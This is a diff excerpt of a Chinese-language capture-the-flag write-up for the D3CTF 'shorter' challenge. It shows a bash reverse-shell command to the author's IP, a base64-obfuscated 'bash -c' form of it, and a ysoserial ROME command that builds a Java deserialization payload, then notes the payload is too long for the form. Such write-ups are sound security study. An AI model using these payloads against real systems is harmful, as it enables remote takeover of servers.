@@ -19,9 +19,11 @@
 ![avartar](img/d3ctf_shorter_4.png)
 
 反弹shell的命令为`bash -i >& /dev/tcp/123.123.12.12/2224 0>&1`，其中的123.123.12.12是我家的ip地址。但是Java的exec不支持这种重定向的行为，所以需要先用Base64编码，再用`bash -c`来运行：
+
 ```/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMTIzLjEyLjEyLzIyMjQgMD4mMQo=}|{base64,-d}|{bash,-i}```
 
 使用ysoserial可以生成payload：
+
 ```java -jar ysoserial.jar ROME '/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMTIzLjEyLjEyLzIyMjQgMD4mMQo=}|{base64,-d}|{bash,-i}' | base64```
 
 但是后端限制的表单内容长度为1956，上面这段命令生成的payload长度达到了4512，所以得想办法减少长度。
